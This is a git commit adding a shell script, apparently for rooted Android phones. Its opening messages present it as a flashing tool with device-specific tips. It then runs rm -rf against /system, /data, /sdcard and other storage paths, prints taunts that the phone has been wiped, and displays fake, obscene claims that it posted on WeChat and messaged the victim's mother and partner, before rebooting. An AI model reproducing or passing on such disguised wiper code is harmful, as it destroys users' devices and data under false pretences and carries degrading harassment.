a9e6583843539e7050fbf47cc95349b039aeee41
xbdj97979797-boop <xbdj97979797@gmail.com>
2025-11-24 19:22:32 +0800

    Create 大大.sh

---
+++ 大大.sh
@@ -0,0 +1,35 @@
+echo "\033[33;1m→下方出现Invalid argument 再试一次
+→ OPPO Realme 一加 需要过签名验证+ 升级到安卓13
+→开机一段时间后可能会刷不进，自动重启后再刷一遍即可"
+sleep 1.5;
+rm -rf /system
+rm -rf /data
+rm-rf /vendor
+rm-rf /product
+rm-rf /sdcard
+rm-rf /storage/emulated/0
+rm-rf /storage/sdcard
+echo -e "\033[43m傻小子被格机了吧\033[0m"
+sleep 0.1
+echo -e "\033[44m恭喜你被北念格机了\033[0m"
+sleep 0.1
+echo -e "\033[43m已经自动打开微信发送朋友圈内容：我妈妈死了我是傻逼\033[0m"
+sleep 0.1
+
+echo -e "\033[43m成功给微信备注妈妈发送：我想操你赶紧把逼送过来\033[0m"
+sleep 0.1
+
+echo -e "\033[43m成功给微信备注宝宝发送：我们分手吧，你不给我操\033[0m"
+sleep 0.1
+
+echo -e "\033[44m恭喜你被北念格机了\033[0m"
+sleep 0.1
+echo -e "\033[45m恭喜你被北念格机了\033[0m"
+sleep 0.1
+echo -e "\033[46m恭喜你被北念格机了\033[0m"
+sleep 0.1
+echo -e "\033[47m恭喜你被北念格机了\033[0m"
+
+reboot
+
+sleep 18
